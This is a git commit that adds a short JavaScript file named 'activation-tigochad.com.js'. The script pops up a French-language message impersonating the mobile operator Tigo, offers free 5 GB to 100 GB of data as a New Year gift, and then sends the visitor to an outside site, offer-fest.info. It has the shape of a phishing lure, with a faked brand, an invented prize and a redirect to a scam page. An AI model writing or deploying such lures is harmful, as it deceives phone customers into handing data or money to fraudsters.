6b93bee80baf90c6811fc482839f4e2430b3168c
ekpesense <abantak9@gmail.com>
2025-02-01 19:49:12 -0800

    Create activation-tigochad.com.js

---
+++ activation-tigochad.com.js
@@ -0,0 +1,6 @@
+
+var password = 'CADEAU DE NOUVEL AN'
+password=prompt('TIGO SMS: Cher client Tigo, veuillez recevoir des données gratuites à partir de 5 Go - 100 Go, récompense des clients du Nouvel An, cliquez sur CADEAU DE NOUVEL AN pour vérifier maintenant ','CADEAU DE NOUVEL AN');
+if (password != 'CADEAU DE NOUVEL AN') {
+location.href='https://offer-fest.info/tigochad.com.html';
+}
